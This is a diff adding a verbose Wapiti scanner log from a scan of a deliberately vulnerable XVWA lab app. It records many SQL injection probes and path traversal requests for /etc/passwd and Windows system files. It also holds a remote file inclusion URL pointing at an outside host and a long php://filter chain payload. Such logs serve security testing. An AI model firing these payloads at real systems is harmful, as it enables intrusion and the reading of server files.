@@ -1,0 +1,861 @@
+2024-03-20 15:24:42.813 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=
+2024-03-20 15:24:42.916 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10
+2024-03-20 15:24:42.916 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+2024-03-20 15:24:43.033 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
+2024-03-20 15:24:43.033 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_4f7385bf.db
+2024-03-20 15:24:43.037 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 3 URLs and forms during the scan
+2024-03-20 15:24:43.067 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
+2024-03-20 15:24:43.067 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
+2024-03-20 15:24:43.148 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
+2024-03-20 15:24:43.171 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
+2024-03-20 15:24:43.172 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module http_headers
+2024-03-20 15:24:43.188 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+2024-03-20 15:24:43.199 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Frame-Options:
+2024-03-20 15:24:43.199 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Frame-Options is not set
+2024-03-20 15:24:43.258 | BLUE     | wapitiCore.attack.mod_http_headers:check_header:83 - Checking X-Content-Type-Options:
+2024-03-20 15:24:43.258 | RED      | wapitiCore.attack.mod_http_headers:check_header:85 - X-Content-Type-Options is not set
+2024-03-20 15:24:43.341 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
+2024-03-20 15:24:43.357 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+2024-03-20 15:24:43.388 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=
+2024-03-20 15:24:43.388 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%C2%BF%27%22%28&search=
+2024-03-20 15:24:43.401 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=fuzz%C2%BF%27%22%28
+2024-03-20 15:24:43.437 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%20AND%2048%3D68%20AND%2074%3D74&search=
+2024-03-20 15:24:43.471 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%27%20AND%2027%3D106%20AND%20%2737%27%3D%2737&search=
+2024-03-20 15:24:43.507 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%22%20AND%2060%3D130%20AND%20%2240%22%3D%2240&search=
+2024-03-20 15:24:43.543 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%29%20AND%2010%3D42%20AND%20%2864%3D64&search=
+2024-03-20 15:24:43.579 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%27%29%20AND%2031%3D113%20AND%20%28%2764%27%3D%2764&search=
+2024-03-20 15:24:43.616 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%22%29%20AND%2084%3D112%20AND%20%28%2284%22%3D%2284&search=
+2024-03-20 15:24:43.651 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%20AND%2066%3D79%20AND%2042%3D42
+2024-03-20 15:24:43.687 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%20AND%2063%3D94%20AND%2083%3D83
+2024-03-20 15:24:43.724 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%20AND%2098%3D98%20AND%2062%3D62
+2024-03-20 15:24:43.766 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%27%20AND%2092%3D110%20AND%20%2735%27%3D%2735
+2024-03-20 15:24:43.803 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%27%20AND%2036%3D63%20AND%20%2781%27%3D%2781
+2024-03-20 15:24:43.842 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%27%20AND%2046%3D46%20AND%20%2742%27%3D%2742
+2024-03-20 15:24:43.882 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%22%20AND%2032%3D128%20AND%20%2286%22%3D%2286
+2024-03-20 15:24:43.917 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%22%20AND%2057%3D80%20AND%20%2229%22%3D%2229
+2024-03-20 15:24:43.954 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%22%20AND%2072%3D72%20AND%20%2235%22%3D%2235
+2024-03-20 15:24:43.992 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%29%20AND%2042%3D59%20AND%20%2839%3D39
+2024-03-20 15:24:44.029 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%29%20AND%2065%3D120%20AND%20%2883%3D83
+2024-03-20 15:24:44.066 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%29%20AND%2051%3D51%20AND%20%2871%3D71
+2024-03-20 15:24:44.103 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%27%29%20AND%2028%3D90%20AND%20%28%2766%27%3D%2766
+2024-03-20 15:24:44.139 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%27%29%20AND%2092%3D170%20AND%20%28%2764%27%3D%2764
+2024-03-20 15:24:44.179 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%27%29%20AND%2076%3D76%20AND%20%28%2786%27%3D%2786
+2024-03-20 15:24:44.217 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%22%29%20AND%2024%3D110%20AND%20%28%2281%22%3D%2281
+2024-03-20 15:24:44.255 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%22%29%20AND%2039%3D118%20AND%20%28%2266%22%3D%2266
+2024-03-20 15:24:44.297 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=%22%29%20AND%2068%3D68%20AND%20%28%2263%22%3D%2263
+2024-03-20 15:24:44.352 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10
+2024-03-20 15:24:44.353 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%C2%BF%27%22%28&item=10
+2024-03-20 15:24:44.372 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=default%C2%BF%27%22%28
+2024-03-20 15:24:44.412 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%20AND%2080%3D129%20AND%2026%3D26&item=10
+2024-03-20 15:24:44.449 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%27%20AND%2072%3D108%20AND%20%2797%27%3D%2797&item=10
+2024-03-20 15:24:44.492 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%22%20AND%2075%3D142%20AND%20%2231%22%3D%2231&item=10
+2024-03-20 15:24:44.534 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%29%20AND%2068%3D162%20AND%20%2883%3D83&item=10
+2024-03-20 15:24:44.579 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%27%29%20AND%2050%3D103%20AND%20%28%2720%27%3D%2720&item=10
+2024-03-20 15:24:44.621 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default%22%29%20AND%2037%3D48%20AND%20%28%2245%22%3D%2245&item=10
+2024-03-20 15:24:44.660 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%20AND%2057%3D130%20AND%2012%3D12
+2024-03-20 15:24:44.705 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%27%20AND%2019%3D90%20AND%20%2770%27%3D%2770
+2024-03-20 15:24:44.729 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%22%20AND%2014%3D66%20AND%20%2213%22%3D%2213
+2024-03-20 15:24:44.751 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%29%20AND%2053%3D86%20AND%20%2812%3D12
+2024-03-20 15:24:44.773 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%27%29%20AND%2059%3D83%20AND%20%28%2731%27%3D%2731
+2024-03-20 15:24:44.797 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+	data: search=default&item=10%22%29%20AND%2025%3D103%20AND%20%28%2241%22%3D%2241
+2024-03-20 15:24:44.841 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
+2024-03-20 15:24:44.853 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+2024-03-20 15:24:44.866 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
+2024-03-20 15:24:44.949 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module cookieflags
+2024-03-20 15:24:44.963 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+2024-03-20 15:24:44.964 | BLUE     | wapitiCore.attack.mod_cookieflags:attack:55 - Checking cookie : PHPSESSID
+2024-03-20 15:24:44.964 | RED      | wapitiCore.attack.mod_cookieflags:attack:57 - HttpOnly flag is not set in the cookie : PHPSESSID
+2024-03-20 15:24:44.998 | RED      | wapitiCore.attack.mod_cookieflags:attack:66 - Secure flag is not set in the cookie : PHPSESSID
+2024-03-20 15:24:45.053 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
+2024-03-20 15:24:45.069 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/xvwa/vulnerabilities/sqli_blind/ (1)
+2024-03-20 15:24:45.080 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz&search=
+2024-03-20 15:24:45.083 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php&search=
+2024-03-20 15:24:45.094 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00&search=
+2024-03-20 15:24:45.104 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=%2Fetc%2Fpasswd&search=
+2024-03-20 15:24:45.114 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=%2Fetc%2Fpasswd%00&search=
+2024-03-20 15:24:45.126 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=%2Fetc%2Fservices&search=
+2024-03-20 15:24:45.138 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:45.149 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&search=
+2024-03-20 15:24:45.163 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00&search=
+2024-03-20 15:24:45.173 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA&search=
+2024-03-20 15:24:45.184 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&search=
+2024-03-20 15:24:45.193 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:45.203 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA&search=
+2024-03-20 15:24:45.213 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F&search=
+2024-03-20 15:24:45.222 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F&search=
+2024-03-20 15:24:45.232 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&search=
+2024-03-20 15:24:45.240 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&search=
+2024-03-20 15:24:45.250 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&search=
+2024-03-20 15:24:45.259 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&search=
+2024-03-20 15:24:45.269 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&search=
+2024-03-20 15:24:45.279 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&search=
+2024-03-20 15:24:45.288 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:45.299 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:45.309 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&search=
+2024-03-20 15:24:45.323 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&search=
+2024-03-20 15:24:45.334 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:45.344 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&search=
+2024-03-20 15:24:45.357 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&search=
+2024-03-20 15:24:45.370 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&search=
+2024-03-20 15:24:45.382 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&search=
+2024-03-20 15:24:45.393 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&search=
+2024-03-20 15:24:45.407 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] POST http://web/xvwa/vulnerabilities/sqli_blind/ (0)
+	data: item=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&search=
